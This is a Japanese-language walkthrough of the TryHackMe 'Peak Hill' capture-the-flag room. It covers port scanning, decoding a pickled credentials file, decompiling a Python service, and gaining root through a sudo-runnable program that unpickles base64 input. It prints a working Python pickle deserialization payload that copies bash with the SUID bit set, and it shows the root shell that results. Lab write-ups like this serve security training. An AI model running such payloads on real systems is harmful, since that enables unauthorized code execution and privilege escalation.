# PeakHill CTF

https://tryhackme.com/room/peakhill

## Enumeration

```shell
TARGET=10.201.41.179
```

### ポートスキャン

```sh
sudo nmap -vv -Pn -p- $TARGET
PORT     STATE  SERVICE  REASON
21/tcp   open   ftp      syn-ack ttl 64
22/tcp   open   ssh      syn-ack ttl 64
7321/tcp open   swx      syn-ack ttl 64
```

```sh
nmap -Pn -sV -p20,21,22,7321 $TARGET

PORT     STATE  SERVICE  VERSION
21/tcp   open   ftp      vsftpd 3.0.3
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
7321/tcp open   swx?
```

FTP, SSH, 不明な7321ポート。

FTP で .creds ファイルを発見。
```sh
$ ls -al                 
total 20
drwxrwxr-x 2 kali kali 4096 Oct 31 11:06 .
drwxrwxr-x 6 kali kali 4096 Oct 31 11:02 ..
-rw-rw-r-- 1 kali kali 7048 May 16  2020 .creds
-rw-rw-r-- 1 kali kali   17 May 16  2020 test.txt
```

7321ポートは、ユーザー名とパスワードを求められる。

```sh
$ nc $TARGET 7321
Username: thm
Password: password
Wrong credentials!
```

## .cred

01の長いテキスト。

```sh
$ cat .creds     
100000000000001101011101011100010000000000101000010110000000101000000000000000000000000001...........
```

単純に8文字を1バイトとして解釈すると、`ssh_passxxx` のような文字列が多数出てくるが・・・

```
]q(X
ssh_pass15qXuqqX	ssh_user1qXhqqX
ssh_pass25qXrqq	X
ssh_pass20q
hqX	ssh_pass7qX_q
....
```

fileコマンドでは判別できなかったが、ChatGPTに見てもらうと、Python Pickleファイルである可能性が非常に高いとの判断。pickleでロードする。

```sh
$ python ./pickle2txt.py                       
[('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', [以下略]]
```

並べ替えるとユーザー名とパスワードになってSSH接続できた。

```sh
gherkin@ubuntu-xenial:~$ ls -al /home
total 16
drwxr-xr-x  4 root    root    4096 May 15  2020 .
drwxr-xr-x 25 root    root    4096 Oct 31 01:59 ..
drwxr-xr-x  5 dill    dill    4096 May 20  2020 dill
drwxr-xr-x  3 gherkin gherkin 4096 Oct 31 02:42 gherkin
```

## pyc ファイル

```sh
gherkin@ubuntu-xenial:~$ ls -al
total 16
drwxr-xr-x 3 gherkin gherkin 4096 Oct 31 02:42 .
drwxr-xr-x 4 root    root    4096 May 15  2020 ..
drwx------ 2 gherkin gherkin 4096 Oct 31 02:42 .cache
-rw-r--r-- 1 root    root    2350 May 15  2020 cmd_service.pyc
```

user.txt は dill への昇格が必要。

```sh
gherkin@ubuntu-xenial:~$ ls -al /home/dill
total 32
drwxr-xr-x 5 dill dill 4096 May 20  2020 .
drwxr-xr-x 4 root root 4096 May 15  2020 ..
-rw------- 1 root root  889 May 20  2020 .bash_history
-rw-r--r-- 1 dill dill 3801 May 18  2020 .bashrc
drwx------ 2 dill dill 4096 May 15  2020 .cache
drwxrwxr-x 2 dill dill 4096 May 20  2020 .nano
drwxr-xr-x 2 dill dill 4096 May 15  2020 .ssh
-r--r----- 1 dill dill   33 May 15  2020 user.txt
```

pycをリバース

```sh
$ pycdc ./cmd_service.pyc > src.py
```

```python
# Source Generated with Decompyle++
# File: cmd_service.pyc (Python 3.8)

from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys
import textwrap
import socketserver
import string
import readline
import threading
from time import *
import getpass
import os
import subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes([REDACTED])

以下略
```

1. これからユーザー名とパスワードを復元
2. 7321ポートで入力すると、dillとしてコマンドを実行できる
3. id_rsa を入手してSSH接続

## 権限昇格

/opt/peak_hill_farm/peak_hill_farm に sudo が付いている。

```sh
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

読めないが実行はできる。

```sh
dill@ubuntu-xenial:~$ ls -al /opt/peak_hill_farm/peak_hill_farm
-rwxr-x--x 1 root root 1218056 May 15  2020 /opt/peak_hill_farm/peak_hill_farm

dill@ubuntu-xenial:~$ file /opt/peak_hill_farm/peak_hill_farm
/opt/peak_hill_farm/peak_hill_farm: executable, regular file, no read permission
```

実行してみたが、現在のユーザーではエラーになるだけ。つまり、xだけ付いていても無意味。

```sh
dill@ubuntu-xenial:~$ /opt/peak_hill_farm/peak_hill_farm
[1726] Cannot open self /opt/peak_hill_farm/peak_hill_farm or archive /opt/peak_hill_farm/peak_hill_farm.pkg
```

sudo で実行すると、Base64文字列を求められた。

```sh
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: potato
failed to decode base64
```

適当なBase64を渡すと、こういう出力。

```sh
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: cG90YXRv
this not grow did not grow on the Peak Hill Farm! :(
```

ディレクトリを見ると、Pythonで動いていると思われる。

```sh
dill@ubuntu-xenial:~$ ls -al /opt/peak_hill_farm/
total 11404
drwxr-xr-x 2 root root    4096 May 15  2020 .
drwxr-xr-x 3 root root    4096 May 20  2020 ..
-rwxr-x--- 1 root root  788413 May 15  2020 base_library.zip
-rwxr-x--- 1 root root   22000 Apr 17  2020 _bz2.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  149880 Apr 17  2020 _codecs_cn.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  158104 Apr 17  2020 _codecs_hk.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   31128 Apr 17  2020 _codecs_iso2022.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  268664 Apr 17  2020 _codecs_jp.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  137592 Apr 17  2020 _codecs_kr.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  113016 Apr 17  2020 _codecs_tw.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  156624 Apr 17  2020 _ctypes.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   29488 Apr 17  2020 _hashlib.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   66800 Jul  4  2019 libbz2.so.1.0
-rwxr-x--- 1 root root 2365952 Feb 27  2019 libcrypto.so.1.0.0
-rwxr-x--- 1 root root  166032 Sep 12  2019 libexpat.so.1
-rwxr-x--- 1 root root  137400 Feb 12  2014 liblzma.so.5
-rwxr-x--- 1 root root 4547880 Apr 17  2020 libpython3.5m.so.1.0
-rwxr-x--- 1 root root  282392 Feb  4  2016 libreadline.so.6
-rwxr-x--- 1 root root  428384 Feb 27  2019 libssl.so.1.0.0
-rwxr-x--- 1 root root  167240 Feb 19  2016 libtinfo.so.5
-rwxr-x--- 1 root root  104864 Jan 21  2020 libz.so.1
-rwxr-x--- 1 root root   37616 Apr 17  2020 _lzma.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   44144 Apr 17  2020 _multibytecodec.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root    6504 Apr 17  2020 _opcode.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--x 1 root root 1218056 May 15  2020 peak_hill_farm
-rwxr-x--- 1 root root   31688 Apr 17  2020 readline.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   15432 Apr 17  2020 resource.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  118744 Apr 17  2020 _ssl.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   25032 Apr 17  2020 termios.cpython-35m-x86_64-linux-gnu.so
```

Python で Base64 デシリアライズ攻撃が可能か HackTricks で検索したところ、下記が見つかった。これも pickle だし、非常に怪しい。

https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html?highlight=base64%20python#pickle

リバースシェルは通信が遮断されているので bash をコピーする方針。

```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("cp /bin/bash /home/dill/bash; chmod +sx /home/dill/bash",))
print(base64.b64encode(pickle.dumps(P())))
```

エクスプロイト

```sh
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: [REDACTED]
This grew to: 
0
```

成功！

```sh
dill@ubuntu-xenial:~$ ls -al /home/dill
total 4080
drwxr-xr-x 5 dill dill    4096 Oct 31 04:31 .
drwxr-xr-x 4 root root    4096 May 15  2020 ..
-rwsr-sr-x 1 root root 1037528 Oct 31 04:31 bash
-rw------- 1 root root     889 May 20  2020 .bash_history
-rw-r--r-- 1 dill dill    3801 May 18  2020 .bashrc
drwx------ 2 dill dill    4096 May 15  2020 .cache
drwxrwxr-x 2 dill dill    4096 May 20  2020 .nano
-rwxrwxr-x 1 dill dill 3104768 Oct 31 03:15 pspy64
drwxr-xr-x 2 dill dill    4096 May 15  2020 .ssh
-r--r----- 1 dill dill      33 May 15  2020 user.txt

dill@ubuntu-xenial:~$ /home/dill/bash -p
bash-4.3# id
uid=1003(dill) gid=1003(dill) euid=0(root) egid=0(root) groups=0(root),1003(dill)
```

## 振り返り

- fileコマンドで判別できないとき、ダメもとで ChatGPT に何のファイルか判別してもらうのは有効。
- オンラインサービスもあり、`Online TrID File Identifier` は今回のファイルをPickleと判別できたので覚えておきたい。

### 判別できたサイト

- https://mark0.net/onlinetrid.py

### 判別できなかったサイト

- https://www.checkfiletype.com/
